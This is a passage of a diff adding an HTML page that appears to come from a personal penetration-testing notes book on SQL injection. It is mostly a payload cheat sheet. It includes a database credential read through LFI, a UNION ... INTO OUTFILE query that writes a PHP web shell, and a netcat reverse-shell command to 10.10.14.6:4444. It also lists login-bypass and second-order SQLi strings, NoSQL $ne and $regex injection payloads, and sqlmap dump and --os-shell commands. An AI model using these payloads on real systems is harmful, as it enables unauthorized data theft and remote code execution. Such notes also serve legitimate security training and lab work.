+            $room-&gt;name=$line['name'];
+            $room-&gt;price=$line['price'];
+            $room-&gt;star=$line['star'];
+            $room-&gt;image=$line['image'];
+            $room-&gt;mini=$line['mini'];
+
+            $room-&gt;printRoom();
+            }
+          ?&gt;
+</code></pre>
+<ul>
+<li>LFI 3</li>
+</ul>
+<pre><code>/var/www/html/connection.php
+
+$connection=new mysqli('127.0.0.1','DBadmin','imissyou','hotel');
+
+</code></pre>
+<ul>
+<li>Reverse shell</li>
+</ul>
+<pre><code>we created it
+
+
+/room.php?cod=-1 UNION SELECT NULL,1,1,4,"&lt;?php system($_GET[\"cmd\"]); ?&gt;",NULL,NULL into OUTFILE"/var/www/html/shell3.php"
+</code></pre>
+<pre><code>we start it
+
+
+/shell3.php?cmd=nc -nv 10.10.14.6 4444 -e /bin/bash
+</code></pre>
+<h1 id="second-order-sqli"><a class="header" href="#second-order-sqli">second order sqli</a></h1>
+<hr />
+<p>we register accounts with a sqli for example</p>
+<pre><code>rop' or 2=2 #
+' or 0=0 ​ --
+' or 0=0 #
+' or 0=0 #"
+' or '1'='1'​ --
+' or 1 ​ --'
+' or 1=1​ --
+' or 1=1 or ''='
+' or 1=1 or ""=
+' or a=a​ --
+' or a=a
+') or ('a'='a
+'hi' or 'x'='x';
+</code></pre>
+<p>Then we log in rop’ or 2=2 #:password</p>
+<h1 id="login-bypass"><a class="header" href="#login-bypass">Login Bypass:</a></h1>
+<hr />
+<p>replace ‘ with “ if fail</p>
+<pre><code>' or '1'='1  
+' or 1=1;--  
+' or 1=1;#  
+') or ('x'='x  
+' or &lt;column&gt; like '%';--  
+' or 1=1 LIMIT 1;--  
+
+USERNAME:   ' or 1/*  
+PASSWORD:   */ =1 --  
+
+USERNAME: admin' or 'a'='a  
+PASSWORD '#  
+
+USERNAME: admin' --  
+PASSWORD:
+</code></pre>
+<h1 id="inject-webshell"><a class="header" href="#inject-webshell">inject webshell</a></h1>
+<hr />
+<pre><code>Mysql
+'*'   
+'&amp;'  
+'^'  
+'-'  
+' or true;--   
+' or 1;--  
+
+union all select "&lt;?php echo shell_exec($_GET['cmd']);?&gt;",2,3,4,5,6 into OUTFILE '/var/www/html/shell.php'
+</code></pre>
+<h1 id="nosql"><a class="header" href="#nosql">NoSql</a></h1>
+<hr />
+<h2 id="like-sql"><a class="header" href="#like-sql">like sql</a></h2>
+<pre><code>select * from usernames where user='$user';
+
+$user-&gt;findone(array(
+"username"=&gt; "$user"
+));
+</code></pre>
+<pre><code>users that are not the same ''
+user-&gt;findone(array(
+"username"=&gt; "{$ne:''}"
+));
+
+</code></pre>
+<h2 id="injection-php"><a class="header" href="#injection-php">injection php</a></h2>
+<p>url check if user exist</p>
+<pre><code>username[$ne]=RandomNoexiste&amp;password[$ne]=noexiste
+</code></pre>
+<h2 id="injection-with-regex-php"><a class="header" href="#injection-with-regex-php">injection with regex php</a></h2>
+<pre><code>check for 1 char and 4 char usernames
+username[$regex]=^.{1}&amp;password=noexist
+username[$regex]=^.{4}&amp;password=noexist
+</code></pre>
+<h2 id="nodejs"><a class="header" href="#nodejs">node.js</a></h2>
+<ol>
+<li>change Content-type application/json</li>
+<li>convert payload to json</li>
+</ol>
+<pre><code>{
+"username": { "$ne": "RandomNOExiste"},
+"passowrd": { "$ne": "ipssec"},
+"login":"login"
+}
+
+</code></pre>
+<h1 id="automated-sql-injection-tools-sqlmap"><a class="header" href="#automated-sql-injection-tools-sqlmap">Automated sql injection tools [sqlmap]</a></h1>
+<hr />
+<p>look for vulnerabilities</p>
+<pre><code>root@kali: sqlmap -u http:192.168.30.35 --crawl=1
+</code></pre>
+<p>Removing date</p>
+<pre><code>root@kali:sqlmap -u http://192.168.30.35/comment.php?id=839 --dbms=mysql --dump --threads=5
+</code></pre>
+<p>other arguments:</p>
+<pre><code>--os-shell: automatic code execution: os-shel&gt; ipconfig -&gt;succes
+</code></pre>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="MySQL.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="PSQL.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="MySQL.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="PSQL.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
